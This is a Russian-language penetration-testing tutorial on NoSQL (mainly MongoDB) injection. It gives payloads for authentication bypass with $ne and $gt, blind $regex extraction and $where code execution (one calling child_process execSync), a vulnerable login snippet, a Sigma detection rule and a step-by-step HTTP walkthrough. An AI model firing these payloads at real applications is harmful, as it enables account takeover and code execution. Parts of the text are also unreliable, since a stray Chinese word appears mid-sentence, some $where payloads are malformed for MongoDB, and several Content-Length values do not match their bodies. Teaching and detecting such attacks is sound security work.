# Атаки на NoSQL базы данных: механизмы, векторы и методы тестирования

## Контекст и базовые понятия

NoSQL (Not Only SQL) базы данных представляют собой класс систем управления базами данных, которые не используют реляционную модель для работы с данными. В отличие от традиционных СУБД (RDBMS), таких как PostgreSQL, MySQL или Oracle, NoSQL-системы ориентированы на горизонтальное масштабирование, высокую производительность при чтении/записи и гибкость схемы данных. Для специалистов по информационной безопасности и тестированию на проникновение понимание архитектуры NoSQL критически важно, поскольку эти системы часто используются в современных веб-приложениях (Node.js, Python/Django, Java/Spring) для хранения пользовательских сессий, конфигураций, кэширования и основного контента.

Ключевая особенность NoSQL, порождающая специфические уязвимости, — это способ интерпретации входных данных. В реляционных базах данных запросы формируются с помощью структурированного языка SQL, где данные и код строго разделены на этапе компиляции запроса. В NoSQL (особенно в MongoDB, CouchDB, Redis) данные часто передаются в виде объектов (JSON, BSON, XML), которые парсятся непосредственно движком базы данных. Если приложение не валидирует тип передаваемых полей, злоумышленник может внедрить не данные, а код или операторы, которые будут выполнены на стороне сервера.

Основное разграничение в контексте атак проводится между двумя типами уязвимостей: **NoSQL Injection** (внедрение в запросы) и **NoSQL Injection через десериализацию** (или манипуляцию типами данных). Также важно различать атаки на разные типы NoSQL-систем, так как механизмы защиты и уязвимости в них принципиально отличаются.

| Характеристика | Реляционные БД (SQL) | NoSQL (документоориентированные, напр. MongoDB) | NoSQL (ключ-значение, напр. Redis) |
| :--- | :--- | :--- | :--- |
| **Язык запросов** | SQL (структурированный, компилируемый) | JSON/BSON (десериализуемый объект) | Командный протокол (текстовый/бинарный) |
| **Механизм защиты** | Parameterized Queries (Prepared Statements) | Валидация типов, санитизация ввода | Аутентификация, ACL, изоляция сети |
| **Типичная уязвимость** | SQL Injection (строковая интерполяция) | NoSQL Injection (манипуляция операторами `$gt`, `$ne`) | Unauthenticated Access, Cache Poisoning |
| **Схема данных** | Жесткая (таблицы, столбцы) | Гибкая (документы, вложенные поля) | Отсутствует (любые байты как значение) |
| **Вектор атаки** | Экранирование кавычек, UNION-запросы | Логические операторы, пустые объекты, `$where` | Передача команд, чтение памяти |

Путаница между понятиями «NoSQL Injection» и «SQL Injection» часто приводит к ошибкам при тестировании. SQL Injection эксплуатирует неспособность приложения экранировать спецсимволы SQL (например, `'`, `--`, `;`) в строковых литералах. NoSQL Injection эксплуатирует способность движка базы данных интерпретировать значения полей JSON как объекты или операторы. Например, в MongoDB поле `username: "admin"` является строкой, а `username: { $ne: null }` — объектом с оператором. Если приложение передает пользовательский ввод напрямую в метод поиска без проверки типа, возникает уязвимость.

Другой важный аспект — **беспарольная аутентификация** (Authentication Bypass). В MongoDB по умолчанию (в старых версиях и при неправильной конфигурации) порт 27017 открыт без аутентификации. Это не является уязвимостью кода, но критической ошибкой конфигурации, позволяющей получить полный доступ к данным. В контексте тестирования на проникновение это часто первый шаг: обнаружение открытого порта NoSQL-сервиса.

## Внутреннее устройство предмета

Для понимания механизмов атак необходимо рассмотреть внутреннее устройство процесса обработки запросов в типичной связке «Веб-приложение — NoSQL-база данных». Рассмотрим архитектуру на примере MongoDB, как наиболее распространенной системы, подверженной инъекциям.

### Механизм обработки запросов и формирования объектов

Приложение получает HTTP-запрос (например, POST `/login`) с телом в формате JSON:
```json
{
  "username": "user_input",
  "password": "pass_input"
}
```
Если разработчик использует небезопасный паттерн, он может сформировать запрос к базе данных, напрямую подставляя значения из JSON в объект фильтрации:
```javascript
// Уязвимый код (Node.js + Mongoose/MongoDB driver)
const user = await db.collection('users').findOne({
    username: req.body.username,
    password: req.body.password
});
```
Здесь `req.body.username` и `req.body.password` — это сырые данные из запроса. В MongoDB метод `findOne` ожидает объект-фильтр. Если пользователь передает строку, она сравнивается как строка. Если пользователь передает объект, он интерпретируется как логическое выражение.

### Ключевые элементы уязвимости: Операторы и Типы данных

Уязвимость возникает из-за динамической природы BSON/JSON. Основные элементы, используемые в атаках:

1.  **Операторы сравнения:** `$gt` (больше), `$lt` (меньше), `$ne` (не равно), `$eq` (равно), `$regex` (регулярное выражение).
2.  **Логические операторы:** `$or`, `$and`, `$nor`.
3.  **Специальные операторы:** `$where` (выполнение JavaScript-кода на сервере), `$gt` для чисел.
4.  **Типы данных:** Строки, числа, булевы значения, объекты, массивы, `null`.

### Механизм возникновения уязвимости

Уязвимость возникает при нарушении инварианта: «Входные данные пользователя должны быть строго типизированы как строки или числа, а не как объекты или массивы». Если приложение не проверяет `typeof` переданных полей, злоумышленник может изменить структуру JSON.

**Варианты эксплуатации:**

*   **Обход аутентификации:** Использование оператора `$ne` (не равно) или `$gt` (больше), который всегда возвращает `true` для определенных условий.
    *   Пример: `{"username": {"$ne": null}, "password": {"$ne": null}}`. Этот запрос вернет первого пользователя в коллекции, игнорируя правильность пароля.
*   **Извлечение данных:** Использование `$regex` для перебора символов (blind injection).
*   **Выполнение кода:** Использование `$where` или `mapReduce` для выполнения произвольного JavaScript на сервере БД.

### Архитектура атаки и точки взаимодействия

```text
[Клиент (Атакующий)]
       │
       │ 1. HTTP POST /login
       │ Body: {"username": {"$ne": null}, "password": {"$ne": null}}
       ▼
[Веб-приложение (Backend)]
       │
       │ 2. Парсинг JSON (без валидации типов)
       │ req.body.username = { $ne: null }
       ▼
[Драйвер БД (MongoDB Driver)]
       │
       │ 3. Формирование BSON-документа
       │ { username: { $ne: null }, password: { $ne: null } }
       ▼
[База данных (MongoDB Server)]
       │
       │ 4. Исполнение запроса
       │ Находит документ, где username != null И password != null
       │ Возвращает первый совпадающий документ (часто admin)
       ▼
[Результат]
       │
       │ 5. Возврат объекта пользователя
       │ Атакующий получает сессию администратора
```

### Индикаторы наличия уязвимости

*   **Ответы сервера:** Различия в ответах при передаче строковых значений vs объектов. Например, запрос `{"user": "admin"}` возвращает 401, а `{"user": {"$gt": ""}}` возвращает 200 OK или объект пользователя.
*   **Временные задержки:** При использовании `$where` или сложных регулярных выражений может наблюдаться задержка ответа (time-based injection).
*   **Ошибки парсинга:** Если приложение жестко ожидает строку, передача объекта может вызвать ошибку `CastError` или `ValidationError`, что указывает на возможность манипуляции типом.

## Применение и работа с предметом

На практике тестирование на проникновение NoSQL-баз данных требует использования специализированных инструментов и ручных техник. Основная задача — определить, как приложение передает данные в запрос к БД, и能否 ли изменить тип этих данных.

### Инструментарий и автоматизация

Для автоматизированного поиска уязвимостей используются сканеры и скрипты.

1.  **Burp Suite (Intruder):** Позволяет перебирать payload'ы в HTTP-запросах. Необходимо настроить payload'ы для замены значений полей JSON на объекты с операторами.
2.  **NoSQLMap:** Специализированный инструмент для эксплуатации уязвимостей NoSQL. Он автоматизирует обход аутентификации, кражу данных и выполнение команд.
3.  **Custom Scripts (Python):** Написание скриптов с использованием библиотеки `requests` для отправки модифицированных JSON-запросов.

### Паттерны эксплуатации и техники

#### 1. Обход аутентификации (Authentication Bypass)

Самый распространенный вектор. Цель — получить доступ к системе без знания учетных данных.

**Payload для MongoDB:**
```json
{
  "username": { "$ne": null },
  "password": { "$ne": null }
}
```
Этот запрос эквивалентен SQL-запросу `WHERE username IS NOT NULL AND password IS NOT NULL`, что всегда истинно для любого существующего пользователя.

**Payload для обхода только одного поля:**
```json
{
  "username": "admin",
  "password": { "$gt": "" }
}
```
Здесь `$gt: ""` (больше, чем пустая строка) часто возвращает `true` для любых непустых паролей, если поле не является числом.

#### 2. Blind NoSQL Injection (Извлечение данных)

Если прямой обход не работает, используется техника blind injection. Злоумышленник проверяет условия по одному символу.

**Пример извлечения имени пользователя:**
Проверка первого символа имени пользователя:
```json
{
  "username": { "$regex": "^a" }
}
```
Если ответ содержит пользователя, значит имя начинается на 'a'. Затем проверяется второй символ:
```json
{
  "username": { "$regex": "^ab" }
}
```
Этот процесс повторяется до полного восстановления имени.

#### 3. Выполнение кода (Code Execution)

Если уязвимость позволяет передать объект в поле, которое интерпретируется как код, можно выполнить произвольный JavaScript.

**Payload для `$where`:**
```json
{
  "username": { "$where": "this.username === 'admin'" }
}
```
Или более опасный вариант:
```json
{
  "username": { "$where": "require('child_process').execSync('id').toString()" }
}
```
*Примечание:* Этот метод работает только если в коде приложения явно используется `$where` или аналогичные механизмы выполнения кода на стороне сервера.

### Типичные ошибки и подводные камни

1.  **Неверная валидация типов:** Проверка `if (req.body.username)` не защищает от объектов. Необходимо проверять `typeof req.body.username === 'string'`.
2.  **Использование `$where`:** Оператор `$where` выполняет JavaScript на сервере, что является антипаттерном из-за риска выполнения кода и низкой производительности.
3.  **Небезопасная десериализация:** В некоторых фреймворках (например, Spring Data MongoDB) автоматическая привязка параметров может привести к уязвимостям, если не настроены строгие схемы.
4.  **Путаница с SQL:** Попытка использовать SQL-синтаксис (`' OR 1=1 --`) в NoSQL-запросах не сработает, так как драйверы NoSQL не понимают SQL.

### Примеры конфигураций и правил детекции

Для защиты от NoSQL Injection необходимо использовать параметризованные запросы или строгую валидацию.

**Пример безопасного кода (Node.js):**
```javascript
// Безопасный код: явное приведение типов
const username = String(req.body.username);
const password = String(req.body.password);

const user = await db.collection('users').findOne({
    username: username,
    password: password
});
```

**Пример правила Sigma для обнаружения атаки в логах:**
```yaml
title: NoSQL Injection Attempt
id: 12345678-1234-1234-1234-123456789012
status: experimental
logsource:
    category: application
    product: webapp
detection:
    selection:
        message|contains:
            - '$ne'
            - '$gt'
            - '$regex'
            - '$where'
    condition: selection
falsepositives:
    - Legitimate use of regex in search functionality
```

## Сквозной практический пример: Обход аутентификации в MongoDB

**Исходные условия:**
*   **Среда:** Локальный Docker-контейнер с MongoDB (версия 4.4, аутентификация отключена для демонстрации уязвимости конфигурации, но приложение требует логина).
*   **Приложение:** Веб-приложение на Node.js с уязвимым кодом аутентификации.
*   **Инструменты:** Burp Suite Professional, curl.
*   **Роль:** Тестировщик на проникновение.
*   **Сценарий:** Обход формы логина для получения доступа к административной панели.

### Шаг 1: Анализ стандартного запроса

Перехватываем нормальный запрос логина через Burp Suite.

```http
POST /api/login HTTP/1.1
Host: target-app.local
Content-Type: application/json
Content-Length: 45

{"username": "testuser", "password": "testpass"}
```

Ожидаемый результат: Возврат 200 OK с токеном сессии, если данные верны, или 401 Unauthorized.

### Шаг 2: Тестирование на типизацию (Type Juggling)

Проверяем, как приложение обрабатывает объекты вместо строк. Меняем значение `username` на объект с оператором `$ne`.

```http
POST /api/login HTTP/1.1
Host: target-app.local
Content-Type: application/json
Content-Length: 65

{"username": {"$ne": null}, "password": {"$ne": null}}
```

**Ожидаемый вывод:**
Если приложение уязвимо, сервер выполнит запрос:
`db.users.findOne({ username: { $ne: null }, password: { $ne: null } })`
Это вернет первого пользователя в коллекции (часто это администратор). Ответ будет `200 OK` с токеном сессии администратора.

### Шаг 3: Эксплуатация через `$gt` (если `$ne` заблокирован)

Если валидация на сервере блокирует `$ne`, пробуем оператор `$gt` (больше).

```http
POST /api/login HTTP/1.1
Host: target-app.local
Content-Type: application/json
Content-Length: 63

{"username": "admin", "password": {"$gt": ""}}
```

**Ожидаемый вывод:**
Запрос интерпретируется как: `username == 'admin' AND password > ''`.
Поскольку любой непустой пароль больше пустой строки, это вернет пользователя admin с любым паролем.

### Шаг 4: Blind Injection (если прямой обход не работает)

Если приложение возвращает разные сообщения об ошибке или время отклика, используем blind injection для извлечения данных.

**Payload для проверки первого символа пароля админа:**
```http
POST /api/login HTTP/1.1
Host: target-app.local
Content-Type: application/json
Content-Length: 75

{"username": "admin", "password": {"$regex": "^a"}}
```

**Ожидаемый вывод:**
Если ответ `200 OK`, значит пароль начинается на 'a'. Если `401`, пробуем `^b`, `^c` и т.д.

### Шаг 5: Выполнение кода (Code Execution)

Если уязвимость позволяет передать объект в поле, которое не фильтруется, пробуем `$where`.

```http
POST /api/login HTTP/1.1
Host: target-app.local
Content-Type: application/json
Content-Length: 100

{"username": {"$where": "this.username === 'admin'"}, "password": "anything"}
```

**Ожидаемый вывод:**
Сервер выполняет JavaScript: `this.username === 'admin'`. Если в базе есть пользователь admin, запрос вернет его. Это демонстрирует критическую уязвимость выполнения кода.

**Ожидаемый вывод примера:**
Пример демонстрирует, как отсутствие строгой типизации входных данных позволяет злоумышленнику манипулировать логикой запроса к базе данных. В шаге 2 мы получили доступ к администратору без знания пароля, что является полным компрометацией учетной записи. В шаге 5 мы продемонстрировали возможность выполнения произвольного кода, что может привести к полному контролю над сервером.

## Аналитический вывод

Атаки на NoSQL базы данных представляют собой серьезную угрозу для современных веб-приложений, особенно тех, которые используют MongoDB, CouchDB или Redis. Ключевая уязвимость заключается в динамической природе форматов данных (JSON/BSON), которые позволяют передавать не только значения, но и операторы сравнения и логические выражения. В отличие от SQL Injection, где атакующий манипулирует структурой запроса через экранирование, NoSQL Injection эксплуатирует способность движка базы данных интерпретировать поля объектов как команды.

Наиболее распространенным вектором является обход аутентификации с использованием операторов `$ne`, `$gt` или `$regex`. Эти атаки требуют минимальных усилий для эксплуатации и часто успешны из-за небрежности разработчиков в валидации типов данных. Вторым критическим вектором является выполнение кода через оператор `$where` или небезопасную десериализацию, что может привести к удаленному выполнению кода (RCE).

Защита от NoSQL Injection требует строгой типизации входных данных, использования параметризованных запросов (где это возможно) и отключения небезопасных операторов, таких как `$where`. Тестирование на проникновение должно включать проверку типов полей JSON и анализ ответов сервера на наличие различий при передаче объектов вместо строк. Понимание внутренней архитектуры NoSQL-систем и их механизмов обработки запросов является обязательным навыком для специалистов по информационной безопасности.
